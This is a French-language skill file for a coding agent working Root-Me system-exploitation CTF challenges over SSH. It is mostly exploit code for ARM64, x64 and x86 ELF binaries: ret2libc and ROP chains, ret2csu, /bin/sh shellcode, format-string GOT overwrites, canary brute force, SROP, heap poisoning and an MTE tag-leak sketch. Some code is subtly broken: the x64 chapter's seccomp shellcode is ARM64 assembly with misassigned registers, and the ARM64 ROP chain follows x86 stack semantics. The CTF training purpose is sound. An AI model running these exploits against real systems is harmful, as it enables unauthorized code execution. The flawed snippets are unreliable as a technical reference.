---
name: ctf-app-system
description: Root-Me app-system (SSH-only): ELF x86/x64/ARM64 & Windows Kernel x64. No local GDB. Libc.rip fingerprint, patchelf, ret2libc/ROP/ret2dlresolve, FSOP glibc 2.35+, BROP, ARM64 AAPCS64 / PAC / TikTag MTE, Windows token steal / PreviousMode / Segment Heap.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, pwntools, GDB+pwndbg, ROPgadget, one_gadget, checksec, and SSH access to Root-Me challenge servers.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF App-System (Root-Me)

Skill spécialisé pour les challenges Root-Me de la catégorie **App - System**, accessibles via SSH. La difficulté principale : pas de GDB interactif sur le serveur, pas de pwntools installé, exploit développé localement puis transféré.

## Ressources complémentaires

- [rootme-ssh.md](rootme-ssh.md) — Workflow SSH Root-Me : connexion, fingerprint libc (libc.rip API), transfert exploit, patchelf, one_gadget remote, DynELF
- [elf-x86.md](elf-x86.md) — ELF 32-bit : cdecl (args sur pile), ret2libc 32-bit, shellcode i386, `int 0x80` syscalls, ret2dlresolve x86, format string 32-bit, ASLR brute-force, race condition TOCTOU
- [elf-x64.md](elf-x64.md) — ELF 64-bit : System V AMD64 (rdi/rsi/rdx), ret2csu, PIE+ASLR bypass, canary leak/brute, stack alignment fix, GOT overwrite, one_gadget, BROP, seccomp ORW, leakless heap techniques
- [elf-arm64.md](elf-arm64.md) — ARM64/AArch64 : AAPCS64 (x0-x7/LR=x30), LR overwrite, JOP vs ROP, PAC bypass (QEMU NOP), TikTag MTE bypass (2024), SROP ARM64, QEMU local testing, gadget rareté
- [winkern-x64.md](winkern-x64.md) — Windows Kernel x64 : token stealing (_EPROCESS offsets), PreviousMode write (CVE-2024-21338), pool overflow, IOCTL AAR/AAW, Segment Heap, Handle Table, SMEP bypass, Windows 11 VBS/HVCI/CFG mitigations, driver IDA analysis

---

## Pattern Recognition Index

Dispatch on **observable binary/remote signals**, not the Root-Me challenge number.

| Signal | Technique → file |
|---|---|
| `readelf -h` → ELFCLASS32, EM_386; args on stack | i386 cdecl ret2libc / int 0x80 shellcode → elf-x86.md |
| ELFCLASS64 EM_X86_64, stack buffer overflow, libc present | ret2libc + ret2csu + rdi gadget → elf-x64.md |
| ELFCLASS64 EM_AARCH64 | AAPCS64 LR overwrite / JOP → elf-arm64.md |
| Binary with BTI + PAC symbols (`paciasp`, `autiasp`) | PAC bypass / TikTag MTE leak → elf-arm64.md |
| PE64 driver (`.sys`) + IOCTL handlers | Token stealing / PreviousMode → winkern-x64.md |
| Remote only (no local binary), forking `accept` loop, long timeout | BROP from scratch → elf-x64.md (cross-ref ctf-pwn/brop.md) |
| SSH-only shell, no GDB / no pwntools on server | libc.rip fingerprint + patchelf local → rootme-ssh.md |
| Seccomp filter denies `execve` but allows `open`/`read`/`write` | ORW ROP chain → elf-x64.md |
| FSOP primitive reachable + glibc ≥ 2.35 | FSOPAgain → elf-x64.md |
| Heap primitive + glibc 2.32–2.39 | House of Rust/Water/Tangerine → elf-x64.md (cross-ref ctf-pwn/heap-leakless.md) |
| Windows kernel pool grooming + `SeDebugPrivilege` target | Segment Heap + Handle Table primitives → winkern-x64.md |

Recognize the **mechanic**, not the Root-Me title.

---

---

For inline snippets and quick-reference tables, see [quickref.md](quickref.md). The Pattern Recognition Index above is the dispatch table — always consult it first.



---

<!-- Source: elf-arm64.md -->

# CTF App-System — ELF ARM64 / AArch64

## Spécificités ARM64 critiques

### Convention d'appel ARM64 (AAPCS64)

```
Registres arguments :   x0, x1, x2, x3, x4, x5, x6, x7
Valeur de retour :      x0 (x0:x1 pour 128-bit)
Link Register :         x30 (LR) — adresse de retour
Frame Pointer :         x29 (FP)
Stack Pointer :         sp (aligné à 16 bytes OBLIGATOIRE)
Scratch registers :     x8-x18 (caller-saved)
Preserved registers :   x19-x28, x29, x30 (callee-saved)
```

**DIFFÉRENCE MAJEURE** : Le `ret` en ARM64 saute vers `x30 (LR)`, pas vers la pile.
L'adresse de retour est souvent sauvegardée sur la pile par le prologue.

### Prologue/Epilogue ARM64 typiques

```asm
; Prologue : sauvegarde LR et FP
stp x29, x30, [sp, #-0x20]!   ; push {fp, lr}; sp -= 0x20
mov x29, sp

; Corps de la fonction
...

; Epilogue : restaure et retourne
ldp x29, x30, [sp], #0x20     ; pop {fp, lr}; sp += 0x20
ret                             ; jump to x30

; Si overflow du buffer : overwrite x30 (LR) sauvegardé sur la pile
```

### Layout pile ARM64

```
[ local vars ]  ← sp (aligné 16)
[ x29 (FP)  ]  ← sp + buffer_size
[ x30 (LR)  ]  ← sp + buffer_size + 8  ← TARGET (overwrite return addr)
```

**Offset** = taille_buffer → overwrite x30 (pas de "saved rbp" séparé comme x86)

## Trouver l'offset ARM64

```bash
# GDB avec pwndbg en local (QEMU + ARM64 chroot ou machine ARM)
# Ou cross-compiler pour test

# Méthode 1 : cyclic + crash
python3 -c "from pwn import *; context.arch='aarch64'; sys.stdout.buffer.write(cyclic(200))" \
  | ./challenge
# Dans gdb-multiarch : info registers x30 → valeur corrompue

# Méthode 2 : QEMU user-mode
qemu-aarch64 -g 1234 ./challenge &
gdb-multiarch -ex "set arch aarch64" -ex "target remote :1234" ./challenge

# Méthode 3 : static analysis
objdump -d ./challenge | grep -A3 "sub.*sp"
# Chercher : stp x29, x30, [sp, #-N]!
# → offset = N - 0 (x30 est à sp+8 après le stp)
# → payload = b'A'*N + p64(target_addr)  → overwrite x30
```

## Test local ARM64 avec QEMU

```bash
# Installation
sudo apt install qemu-user-static gcc-aarch64-linux-gnu gdb-multiarch

# Exécuter un binaire ARM64 directement (avec libc ARM64)
qemu-aarch64-static -L /usr/aarch64-linux-gnu ./challenge

# Debug avec GDB
qemu-aarch64-static -g 1234 -L /usr/aarch64-linux-gnu ./challenge &
gdb-multiarch ./challenge -ex "target remote :1234"

# pwntools avec QEMU automatique
from pwn import *
context.arch = 'aarch64'
context.os = 'linux'
io = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './challenge'])
```

## ROP ARM64 : rareté des gadgets

**Problème** : ARM64 a des instructions de taille fixe (4 bytes), ce qui limite drastiquement les gadgets par rapport à x86. Les gadgets `ret` sont rares car ARM64 utilise `br x30` ou `ret`.

```bash
# Trouver les gadgets ARM64
ROPgadget --binary ./challenge --rop --arch aarch64
# Ou ropper
ropper -f ./challenge --arch AARCH64

# Gadgets essentiels à chercher
# ldr x0, [sp, #N]; ldp x29, x30, [sp, #M]; ret  ← charger x0 depuis pile
# blr x0  ← call indirect via registre (JOP)
# ldp xN, xM, [sp, #N]!; ret  ← pop multiple registers
```

## JOP (Jump-Oriented Programming) ARM64

**JOP** = alternative à ROP sur ARM64 quand `ret` gadgets manquent. Utilise `br xN` ou `blr xN` (call via registre) pour chaîner les gadgets.

```python
# Schéma JOP typique :
# Gadget dispatcher : charge xN depuis la pile → br xN
# Chaque gadget : effectue action → charge prochain gadget → br xN

# Exemple avec gadget "ldr x0, [x1]; br x2"
# x1 = adresse de la valeur à charger dans x0
# x2 = adresse du prochain gadget
```

## ret2libc ARM64

```python
from pwn import *

context.arch = 'aarch64'
elf  = ELF('./challenge')
libc = ELF('./libc.so.6')  # libc ARM64

# Gadgets ARM64 (trouver avec ROPgadget)
# Chercher : "ldr x0, [sp, ...]; ... ret" ou "ldp x0, ...; ret"
pop_x0 = ...  # gadget qui met [sp+N] dans x0 puis ret

offset = 72  # à ajuster

# === Stage 1 : Leak puts@GOT ===
payload  = b'A' * offset
# ARM64 : x0 = arg1 → mettre puts@GOT dans x0
payload += p64(pop_x0)
payload += p64(elf.got['puts'])  # valeur pour x0
payload += p64(elf.plt['puts'])  # call puts
payload += p64(elf.symbols['main'])  # retour

io.sendline(payload)
puts_leak = u64(io.recvn(8))
libc_base = puts_leak - libc.symbols['puts']
system    = libc_base + libc.symbols['system']
binsh     = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2  = b'A' * offset
payload2 += p64(pop_x0) + p64(binsh)
payload2 += p64(system)

io.sendline(payload2)
io.interactive()
```

## Shellcode ARM64

```python
from pwn import *
context.arch = 'aarch64'

# Shellcode execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.aarch64.linux.sh())

# Ou shellcode manuel ARM64
shellcode = asm('''
    /* execve("/bin/sh", NULL, NULL) */
    mov x8, #221              /* __NR_execve = 221 */
    adr x0, binsh
    mov x1, #0
    mov x2, #0
    svc #0
    binsh: .asciz "/bin/sh"
''')
```

## Pointer Authentication (PAC) bypass

```bash
# PAC = Pointer Authentication Codes
# Présent sur hardware Apple M1/M2, certains serveurs ARM modernes
# Root-Me challenges : généralement pas de PAC (émulé sous QEMU sans PAC)

# Vérifier si PAC est actif
# Dans le binaire : chercher "pacibsp", "autibsp", "pacia", "autia"
objdump -d ./challenge | grep -E "pac|aut"

# Si QEMU sans PAC extension : les instructions PAC sont NOP → exploit normal
# Si PAC actif : besoin d'oracle pour signer les pointeurs

# Pour Root-Me : vérifier le flag dans qemu-aarch64-static
qemu-aarch64-static -cpu max ./challenge
# "max" inclut toutes les extensions mais émule sans vrai PAC enforcement
```

## Gadgets ARM64 courants dans libc

```bash
# Chercher dans libc ARM64 (souvent plus de gadgets)
ROPgadget --binary ./libc.so.6 --rop --arch aarch64 | grep "pop {x0}"
ropper -f ./libc.so.6 --arch AARCH64 | grep "ldr x0"

# Gadgets typiquement trouvables dans libc ARM64
# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret
# → Parfait pour charger x0 (arg1) depuis la pile
```

## Numéros de syscalls ARM64

```
__NR_read        = 63
__NR_write       = 64
__NR_openat      = 56
__NR_close       = 57
__NR_execve      = 221
__NR_exit        = 93
__NR_mmap        = 222
__NR_mprotect    = 226
__NR_brk         = 214
__NR_rt_sigreturn = 139
```

```python
# Syscall en ARM64
payload = asm('''
    mov x8, 221     ; __NR_execve
    adr x0, sh_str
    mov x1, xzr
    mov x2, xzr
    svc 0
    sh_str: .ascii "/bin/sh\x00"
''')
```

## TikTag — MTE Bypass via Speculative Execution (2024)

**Source :** [github.com/compsec-snu/tiktag](https://github.com/compsec-snu/tiktag) | IEEE S&P 2025  
**Impact :** Bypass hardware Memory Tagging Extension (MTE) via branch predictor / store-to-load forwarding  
**Contexte CTF :** Challenges ARM64 avec MTE activé (Pixel 8, serveurs modernes)

```bash
# Vérifier si MTE est actif dans le challenge
objdump -d ./challenge | grep -E "stg|ldg|irg|addg|subg|gmi"
# stg = store tag, ldg = load tag, irg = insert random tag

# Si MTE présent dans QEMU :
qemu-aarch64-static -cpu max,mte=on ./challenge

# TikTag-v1 : branch predictor side-channel
# Mesurer le temps d'accès après une prédiction de branche
# Un accès avec le mauvais tag cause une exception → timing différent

# TikTag-v2 : store-to-load forwarding
# CPU forward depuis un store avec tag invalide vers un load → leak du tag
# Les deux variantes ont 95%+ de succès sur Pixel 8 hardware
```

```c
// Concept TikTag (simplifié pour CTF)
// Pour chaque tag possible (0-15), tenter un accès et mesurer le timing
// Le bon tag cause un hit, les mauvais causent des exceptions (plus lents)

#include <time.h>
#include <signal.h>

volatile int tag_found = 0;
volatile uint8_t correct_tag = 0;

void sigsegv_handler(int sig) {
    // Exception MTE → mauvais tag, continuer
    longjmp(env, 1);
}

uint8_t leak_mte_tag(void *tagged_ptr) {
    signal(SIGSEGV, sigsegv_handler);
    
    for (uint8_t tag = 0; tag < 16; tag++) {
        // Forger un pointeur avec le tag testé
        void *test_ptr = (void*)((uintptr_t)tagged_ptr | ((uintptr_t)tag << 56));
        
        if (setjmp(env) == 0) {
            struct timespec start, end;
            clock_gettime(CLOCK_MONOTONIC, &start);
            volatile char val = *(char*)test_ptr;  // Accès MTE
            clock_gettime(CLOCK_MONOTONIC, &end);
            
            uint64_t elapsed = (end.tv_nsec - start.tv_nsec);
            if (elapsed < THRESHOLD_NS) {
                return tag;  // Hit → bon tag
            }
        }
        // Exception → mauvais tag, essayer le suivant
    }
    return 0;  // Pas trouvé
}
```

**Pour Root-Me ARM64 avec MTE :**
- La plupart des challenges Root-Me **n'ont pas MTE** (QEMU sans MTE par défaut)
- Vérifier : `cat /proc/cpuinfo | grep mte` sur le serveur
- Si MTE absent → exploit normal sans tag bruteforce

## SROP (Sigreturn-Oriented Programming) ARM64

```python
from pwn import *
context.arch = 'aarch64'

# SROP ARM64 : moins courant qu'en x86 mais possible
# Gadget nécessaire : mov x8, #139 (rt_sigreturn); svc 0
# x8 = 139 = __NR_rt_sigreturn pour ARM64

# Trouver le gadget rt_sigreturn
# Souvent dans la libc ou dans le binaire

# Construire le SigreturnFrame
frame = SigreturnFrame(arch='aarch64')
frame.x0 = 0               # arg1 pour execve
frame.x8 = 221             # __NR_execve
frame.sp = binsh_addr      # pas utilisé ici
frame.pc = syscall_gadget  # adresse d'une instruction svc #0

# Le payload déclenche sigreturn avec notre frame
payload = b'A' * offset
payload += p64(sigreturn_gadget)  # mov x8, 139; svc 0
payload += bytes(frame)
```

## Debugging ARM64 remote (Root-Me SSH)

```bash
# Sur le serveur Root-Me ARM64 :
# 1. Vérifier l'architecture
file ./challenge   # → ELF 64-bit LSB executable, ARM aarch64

# 2. Vérifier les tools disponibles
which gdb          # rarement présent
which python3      # souvent présent

# 3. QEMU peut être utilisé localement pour debug
# Télécharger le binaire
scp -P 2222 user@host:~/challenge ./

# 4. Tester avec la bonne libc
scp -P 2222 user@host:/lib/aarch64-linux-gnu/libc.so.6 ./libc_arm64.so.6
qemu-aarch64-static -L /usr/aarch64-linux-gnu ./challenge
# Ou avec patchelf
```

## Template exploit ARM64 complet

```python
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'info'

elf  = ELF('./challenge')
libc = ELF('./libc_arm64.so.6')
rop  = ROP(elf)

LOCAL = True
if LOCAL:
    io = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './challenge'])
else:
    shell = ssh('user', 'challenge.root-me.org', port=2222, password='...')
    io = shell.process('./challenge')

offset = 72  # À déterminer avec cyclic

# Gadgets
# Chercher avec ROPgadget --binary ./challenge --binary ./libc_arm64.so.6
pop_x0 = 0x...  # ldr x0, ...; ret ou équivalent

# Exploit
payload = flat([
    b'A' * offset,
    pop_x0,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
])

io.sendlineafter(b'> ', payload)
leak = u64(io.recvn(8))
libc.address = leak - libc.sym['puts']

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))

payload2 = flat([
    b'A' * offset,
    pop_x0,
    binsh,
    system,
])
io.sendlineafter(b'> ', payload2)
io.interactive()
```



---

<!-- Source: elf-x64.md -->

# CTF App-System — ELF x64 (64-bit)

## Convention d'appel System V AMD64

```
Registres pour les arguments :
  rdi → arg1
  rsi → arg2
  rdx → arg3
  rcx → arg4
  r8  → arg5
  r9  → arg6
  Reste → sur la pile

Valeur de retour : rax
Registres sauvegardés par l'appelé : rbx, rbp, r12-r15
```

**Implication ROP** : pour appeler `system("/bin/sh")`, besoin de `pop rdi; ret` pour mettre `/bin/sh` dans rdi.

## Stack layout 64-bit

```
[ arg7+... ]  ← si plus de 6 args
[ ret addr ]  ← rsp+0  (← RIP overwrite)
[ saved rbp]  ← rbp
[ local vars]
[ buffer   ]  ← rbp-N
```

**Offset** = N + 8 (saved RBP) → overwrite return address.

## Stack alignment critique (SIGSEGV dans movaps)

```python
# PROBLÈME : glibc utilise SSE (movaps) qui requiert alignement 16 bytes
# SYMPTÔME : crash dans system() ou printf() mais pas dans overflow
# SOLUTION : ajouter un gadget `ret` avant l'appel

ret_gadget = elf.address + 0x...  # ROPgadget --binary ./ch | grep ": ret$"
payload = b'A' * offset + p64(ret_gadget) + p64(pop_rdi) + p64(binsh) + p64(system)
#                         ↑ alignment fix
```

## ret2libc 64-bit complet

```python
from pwn import *

elf  = ELF('./challenge')
libc = ELF('./libc.so.6')
rop  = ROP(elf)
context.arch = 'amd64'

# Gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

offset = 72  # cyclic_find(crash_val)

# === Stage 1 : Leak puts@GOT ===
payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # retour pour stage 2

io.sendlineafter(b'> ', payload)
puts_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
system    = libc_base + libc.symbols['system']
binsh     = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2  = b'A' * offset
payload2 += p64(ret)           # alignment
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

io.sendlineafter(b'> ', payload2)
io.interactive()
```

## Contrôler rsi et rdx (3 arguments)

```python
# ROPgadget pour contrôler rsi, rdx
# pop rsi; pop r15; ret  (classique dans __libc_csu_init)
# pop rdx; pop rbx; ret  (souvent dans libc)

pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx_rbx = libc_base + 0x...  # depuis libc

# 3-arg call : open(filename, flags, mode)
payload += p64(pop_rdi) + p64(filename_addr)
payload += p64(pop_rsi_r15) + p64(O_RDONLY) + p64(0)  # r15 = junk
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)         # mode + junk
payload += p64(open_addr)
```

## ret2csu (quand gadgets manquent)

```python
# __libc_csu_init contient deux blocs de gadgets universels :
# Gadget A (fin de boucle) :
#   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# Gadget B (dans la boucle) :
#   mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

# Trouver les offsets
elf.symbols['__libc_csu_init']
# Gadget A = csu + 0x5a (souvent), Gadget B = csu + 0x40

def ret2csu(func_got_ptr, arg1=0, arg2=0, arg3=0, ret_addr=None):
    """Appel une fonction avec 3 arguments via __libc_csu_init"""
    csu_end   = elf.symbols['__libc_csu_init'] + 0x5a  # pop rbx...
    csu_mid   = elf.symbols['__libc_csu_init'] + 0x40  # mov rdx,r15...
    
    chain  = p64(csu_end)
    chain += p64(0)               # rbx = 0 (pour call [r12+0])
    chain += p64(1)               # rbp = 1 (condition boucle)
    chain += p64(func_got_ptr)    # r12 → fonction à appeler
    chain += p64(arg1)            # r13 → edi (arg1, 32-bit!)
    chain += p64(arg2)            # r14 → rsi (arg2)
    chain += p64(arg3)            # r15 → rdx (arg3)
    chain += p64(csu_mid)         # retour vers le milieu de csu
    # 7 * p64(0) pour les registres pop après la boucle
    chain += p64(0) * 7
    if ret_addr:
        chain += p64(ret_addr)
    return chain
```

## PIE bypass

```python
# PIE = Position Independent Executable : toutes les adresses randomisées

# Méthode 1 : leak via format string
payload = b'%p.' * 30  # Trouver une adresse du binaire sur la pile
# Identifier l'adresse (se termine généralement en adresse connue)
# Soustrait l'offset pour trouver la base PIE

# Méthode 2 : partial overwrite (quand canary absent)
# Seuls les 12 bits de poids faible sont fixes (alignement page)
# Overwrite seulement les 2 derniers octets du RIP
payload = b'A' * offset + p16(0x1234)  # 50% chance avec 1 nibble aléatoire

# Méthode 3 : information disclosure via format string
# leak PIE base : adresse retour dans main visible sur la pile
# Souvent : stack[offset] - (main+N) = PIE_base
```

## Canary leak et bypass

```python
# Méthode 1 : format string leak
# Canary est sur la pile, trouve son offset avec %N$p
# Généralement finit par \x00 (null byte)
for i in range(1, 50):
    io.sendline(f'%{i}$016lx'.encode())
    val = int(io.recvline().strip(), 16)
    if val & 0xff == 0:  # Canary commence par \x00
        print(f"Canary à la position {i}: {hex(val)}")

# Méthode 2 : brute-force byte par byte (serveur forking)
canary = b'\x00'  # 1er byte toujours nul
for idx in range(1, 8):  # 7 bytes restants
    for byte in range(256):
        # Envoyer : buffer_size + bytes_du_canary + byte_test
        payload = b'A' * offset + canary + bytes([byte])
        # Si pas de "stack smashing detected" → byte correct
        ...
    canary += bytes([found_byte])

# Utilisation du canary leaké dans le payload
payload = b'A' * canary_offset + canary + p64(0)  # saved rbp
payload += p64(pop_rdi) + p64(binsh) + p64(system)
```

## GOT overwrite (Partial RELRO)

```python
# Overwrite une entrée GOT pour rediriger un appel de fonction
# Nécessite : Partial RELRO (GOT writable) + pas de PIE ou PIE leaké

target_got = elf.got['exit']    # ou 'puts', 'printf', etc.
win_func   = elf.symbols['win'] # ou system

# Via format string (méthode principale)
from pwn import fmtstr_payload
payload = fmtstr_payload(fmt_offset, {target_got: win_func}, write_size='short')

# Via overflow direct (si adresse fixe)
# Écrire win_func à l'adresse target_got
```

## one_gadget (shell direct sans args)

```python
from pwn import *
import subprocess

# Trouver les gadgets
result = subprocess.check_output(['one_gadget', 'libc.so.6']).decode()
# → 0x4f2a5 execve("/bin/sh", rsp+0x40, environ) constraints: [rsp+0x40] == NULL
# → 0x4f302 execve("/bin/sh", rsp+0x40, environ) constraints: [rsp+0x40] == NULL

# Tester chaque gadget
for offset in [0x4f2a5, 0x4f302, 0xe6c7e]:
    one_gadget = libc_base + offset
    payload = b'A' * padding + p64(one_gadget)
    # Si les contraintes sont satisfaites → shell direct
```

## Techniques avancées x64

### Stack pivot (overflow limité)

```python
# Quand overflow < 16 bytes (seulement RBP + RIP)
# Pattern : overwrite RBP → zone contrôlée, RIP → leave;ret

leave_ret = rop.find_gadget(['leave', 'ret'])[0]
fake_stack = elf.bss() + 0x100  # Zone BSS contrôlable

# Stage 1 : pivot vers BSS
payload = b'A' * (offset - 8) + p64(fake_stack) + p64(leave_ret)
# Stage 2 : ROP chain en BSS (lire via read() par ex)
```

### Format string → leak multiple (PIE + canary + libc)

```python
# Un seul format string pour leaker tout
# Chercher sur la pile : adresse libc, adresse binaire, canary
payload = b'%p.' * 50
io.sendline(payload)
leaks = io.recvline().decode().split('.')
# Analyser chaque valeur :
# - libc : commence par 0x7f
# - canary : termine par \x00 (visible comme 0x...XX00)
# - PIE : offset connu par rapport à sections

for i, leak in enumerate(leaks):
    val = int(leak, 16) if leak.startswith('0x') else 0
    if val > 0x7f0000000000: print(f"[{i}] Possible libc: {hex(val)}")
    if val & 0xff == 0:       print(f"[{i}] Possible canary: {hex(val)}")
```

### Heap leak pour tcache poison

```python
# tcache poisoning (glibc 2.26-2.31)
# safe-linking (glibc 2.32+) : fd = ptr ^ (chunk_addr >> 12)

# Leak heap address via UAF
io.sendline(b'1')  # alloc
io.sendline(b'3')  # free (sans null)
io.sendline(b'2')  # view → affiche fd du chunk free = heap addr

heap_addr = u64(io.recvn(8))
# glibc 2.32+ : fd = ptr ^ (addr >> 12)
# Pour décoder : heap_key = heap_addr >> 12
# fd_mangled = target_addr ^ heap_key

# tcache poison : allouer 2 chunks, free les 2, overwrite fd du 2ème
```

## BROP (Blind ROP) — serveur SSH sans binaire

```python
# Si le binaire n'est PAS disponible en téléchargement mais accessible via SSH
# Utiliser BROP pour construire l'exploit depuis zéro

# Étape 1 : canary leak byte par byte (serveur forking)
# Étape 2 : stop gadget (adresse qui ne crashe pas)
# Étape 3 : BROP gadget (pop 6 registres) → pop_rdi = brop + 9
# Étape 4 : PLT scanner → trouver puts()
# Étape 5 : puts(pie_base) → dump du binaire
# Étape 6 : Exploit classique sur le binaire dumpé

# Voir ctf-pwn/brop.md pour implémentation complète

# Pour Root-Me SSH : le binaire est souvent DISPONIBLE dans ~/
# → Télécharger via scp avant de tenter BROP
scp -P 2222 user@host:~/challenge ./
```

## Seccomp + ROP (glibc 2.38+)

```python
from pwn import *

# Vérifier les règles seccomp du challenge
# (après connexion SSH ou en local)
seccomp_dump = subprocess.check_output(['seccomp-tools', 'dump', './challenge'])
# Ou en live :
# seccomp-tools dump ./challenge

# Syscalls souvent bloqués : execve, execveat
# Syscalls souvent autorisés : open/openat, read, write, mmap

# Stratégie ORW (Open-Read-Write) quand execve bloqué
from pwn import *

# Shellcode ORW
ORW = asm(f'''
    /* openat(AT_FDCWD, "/challenge/.passwd", O_RDONLY) */
    mov x8, #56          /* __NR_openat */
    mov x0, #-100        /* AT_FDCWD */
    adr x1, flag_path
    mov x2, #0           /* O_RDONLY */
    mov x3, #0
    svc #0
    
    /* read(fd, buf, 0x100) */
    mov x1, x0           /* fd retourné */
    mov x8, #63          /* __NR_read */
    mov x0, x1
    mov x1, sp           /* buf = stack */
    mov x2, #0x100
    svc #0
    
    /* write(1, buf, bytes_read) */
    mov x8, #64          /* __NR_write */
    mov x1, #1
    /* x1 = stdout */
    svc #0
    
    flag_path: .ascii "/challenge/.passwd\\0"
''', arch='aarch64')
```

## Leakless x64 pour Root-Me

```python
# Quand ASLR + PIE + Full RELRO : besoin de leaks
# Mais si le binaire a une vulnérabilité heap ET glibc >= 2.32 :
# Utiliser les techniques leakless (voir ctf-pwn/heap-leakless.md)

# Sur Root-Me : la libc du serveur est souvent identifiable
# 1. Se connecter et noter la version
# 2. Télécharger la libc
# 3. Utiliser les techniques adaptées à cette version

# Workflow adaptatif selon glibc :
def choose_heap_technique(libc_version):
    if libc_version < (2, 26):
        return "fastbin_dup"          # Pas de tcache
    elif libc_version < (2, 32):
        return "tcache_poison"         # tcache sans safe-linking
    elif libc_version < (2, 34):
        return "tcache_safe_linking"   # Besoin du heap key
    elif libc_version < (2, 39):
        return "house_of_water"        # tcache_perthread_struct
    else:
        return "house_of_tangerine"    # malloc-only AAW
```

## Commandes de recon x64

```bash
# Trouver l'offset de puts dans libc (pour calculer libc_base)
readelf -s ./libc.so.6 | grep " puts"
# → 000000000007faa0 ... FUNC GLOBAL DEFAULT   15 puts@@GLIBC_2.2.5

# Trouver /bin/sh dans libc
strings -a -t x ./libc.so.6 | grep "/bin/sh"
# → 1b45bd /bin/sh

# ROPgadget
ROPgadget --binary ./challenge --rop | grep "pop rdi"
ROPgadget --binary ./libc.so.6 --rop | grep "pop rdx"

# pwntools rop
python3 -c "
from pwn import *
elf = ELF('./challenge')
rop = ROP(elf)
print(rop.dump())
"
```



---

<!-- Source: elf-x86.md -->

# CTF App-System — ELF x86 (32-bit)

## Spécificités 32-bit vs 64-bit

| Aspect | x86 32-bit | x86-64 |
|--------|-----------|--------|
| **Convention d'appel** | cdecl : args sur la pile | Registres rdi, rsi, rdx... |
| **Adresses** | 4 octets (0x08048xxx) | 8 octets (0x55..., 0x7f...) |
| **Syscalls** | `int 0x80`, eax=numéro | `syscall`, rax=numéro |
| **ASLR** | 8-bit d'entropie (stack) | 28-bit (plus difficile à bruteforcer) |
| **ret2libc** | system(addr_binsh) simplifié | Besoin de gadgets pop rdi/ret |
| **Shellcode** | Facile (i386) | NX rend nécessaire ROP |

## Stack layout 32-bit

```
[    arg2    ]  ← esp+8 après call
[    arg1    ]  ← esp+4
[ return addr]  ← esp+0  (← RIP overwrite ici)
[  saved ebp ]  ← ebp
[ local vars ]
[  buffer    ]  ← ebp-N
```

**Offset** = N (taille buffer) + 4 (saved EBP) → overwrite return address.

## ret2libc 32-bit (le plus fréquent sur Root-Me)

```python
from pwn import *

elf = ELF('./challenge')
libc = ELF('./libc.so.6')

# Adresses fixes si pas de PIE (classique Root-Me x86)
system_plt = elf.plt['system']       # si dans PLT
puts_plt   = elf.plt['puts']
puts_got   = elf.got['puts']

# === Stage 1 : leak libc via puts(puts@GOT) ===
offset = 76  # buffer + saved_ebp

payload = b'A' * offset
payload += p32(puts_plt)        # call puts
payload += p32(elf.symbols['main'])  # return après puts (stage 2)
payload += p32(puts_got)        # arg1 : adresse à leaker

io.sendline(payload)
puts_leak = u32(io.recv(4))
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2 = b'A' * offset
payload2 += p32(system)         # call system
payload2 += p32(0xdeadbeef)    # return address (peu importe)
payload2 += p32(binsh)          # arg1 : "/bin/sh"

io.sendline(payload2)
io.interactive()
```

## ret2win 32-bit (pas de leak requis)

```python
# Trouver la win function
elf = ELF('./challenge')
win = elf.symbols['win']  # ou 'flag', 'backdoor', etc.

offset = 76
payload = b'A' * offset + p32(win)
```

## ret2libc sans leak (quand PIE désactivé)

```python
# Si PIE désactivé : adresses fixes dans le binaire
# Chercher /bin/sh dans le binaire lui-même
binsh_addr = next(elf.search(b'/bin/sh\x00'))

# Chercher system dans PLT ou libc avec adresse connue
# ROPgadget --binary ./challenge --string "/bin/sh"
```

## Shellcode 32-bit (quand NX désactivé)

```python
from pwn import *
context.arch = 'i386'

shellcode = asm(shellcraft.sh())  # shellcode i386 minimal

# Stack shellcode : overflow → RET = adresse du shellcode sur la pile
offset = 64
# Trouver l'adresse de la pile : via leak ou via NOP sled
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode + b'A' * (offset - len(nop_sled) - len(shellcode))
payload += p32(stack_addr)  # adresse dans le NOP sled
```

## Format string 32-bit

```python
# Leak de la pile : les arguments sont à partir du 1er paramètre positionnel
# En 32-bit, les args format string SONT sur la pile directement

# Trouver son offset sur la pile
for i in range(1, 30):
    io.sendline(f'%{i}$x'.encode())
    print(i, io.recvline())

# Écrire en 32-bit : cible = adresse 4 octets
# %<val>c%<N>$n écrit <val> à l'adresse N sur la pile
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {got_addr: target_addr})
# offset = position de notre input sur la pile (trouver avec %N$x == 0x41414141)
```

## Trouver l'offset de l'overflow

```bash
# Méthode 1 : cyclic pattern
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))"  | ./challenge
# Voir le crash : dmesg | tail ou gdb

# Méthode 2 : GDB local
gdb ./challenge
run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
